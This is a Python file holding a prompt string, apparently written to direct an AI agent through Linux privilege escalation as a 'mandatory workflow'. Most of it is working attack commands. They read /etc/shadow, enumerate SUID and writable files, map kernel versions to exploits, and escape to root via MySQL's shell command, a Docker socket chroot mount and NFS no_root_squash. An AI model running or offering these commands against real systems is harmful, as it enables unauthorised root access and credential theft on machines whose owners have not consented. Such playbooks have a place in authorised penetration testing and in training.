"""
Linux Privilege Escalation Skill Prompt.
"""

LINUX_PRIVESC_SKILL_PROMPT = r"""
## ATTACK SKILL: LINUX PRIVILEGE ESCALATION

### MANDATORY WORKFLOW

#### STEP 1: SYSTEM ENUMERATION
```bash
id; uname -a; cat /etc/os-release; hostname
sudo -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v proc
cat /etc/crontab; ls -la /etc/cron*
cat /etc/passwd | grep -v nologin; cat /etc/shadow 2>/dev/null
ps aux; ss -tlnp; netstat -tlnp
```

#### STEP 2: SUDO ABUSE
If `sudo -l` shows allowed commands: check GTFOBins for each binary.

#### STEP 3: SUID BINARIES
```bash
find / -perm -4000 -type f 2>/dev/null | while read b; do
  echo "=== $b ==="; ls -la "$b"
done
```
Cross-reference with GTFOBins for exploitable SUID binaries.

#### STEP 4: KERNEL EXPLOITS
```bash
uname -r  ->  2.6.32 -> dirtycow, 4.4.0 -> overlayfs, 5.8+ -> seccomp
cat /proc/version
```
Search exploit-db: `searchsploit linux kernel VERSION`

#### STEP 5: SERVICE EXPLOITS
- MySQL running as root? `mysql -e '\! sh'`
- Docker socket: `docker -H unix:///var/run/docker.sock run -v /:/mnt alpine chroot /mnt`
- NFS no_root_squash: mount and create SUID binary
- Cron jobs: writable scripts in cron directories

#### ANTI-PATTERNS: Don't skip `sudo -l` and SUID enumeration — they're the fastest paths. Don't run kernel exploits on production without checking stability.
"""
